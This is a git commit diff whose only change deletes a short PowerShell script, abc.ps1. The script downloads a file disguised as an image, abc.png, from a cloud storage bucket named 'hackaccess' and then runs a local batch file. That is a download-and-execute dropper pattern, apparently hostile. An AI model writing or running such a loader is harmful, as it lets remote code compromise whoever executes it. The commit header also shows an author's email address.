20d0a898f88ba2535cc6b02710754e17c3d30811
DESKTOP-8M0J74Q\User <nwy140@gmail.com>
2018-01-07 22:12:17 +0800

    d

--- abc.ps1
+++
@@ -1,4 +0,0 @@
-$client = new-object System.Net.WebClient
-$client.DownloadFile(“https://firebasestorage.googleapis.com/v0/b/hackaccess-4d765.appspot.com/o/abc.png?alt=media&token=eee61466-da20-4edf-9a2d-f8fc3237e9fb“, ".\abc.png”)
-cmd /c ".\z.bat"
-exit
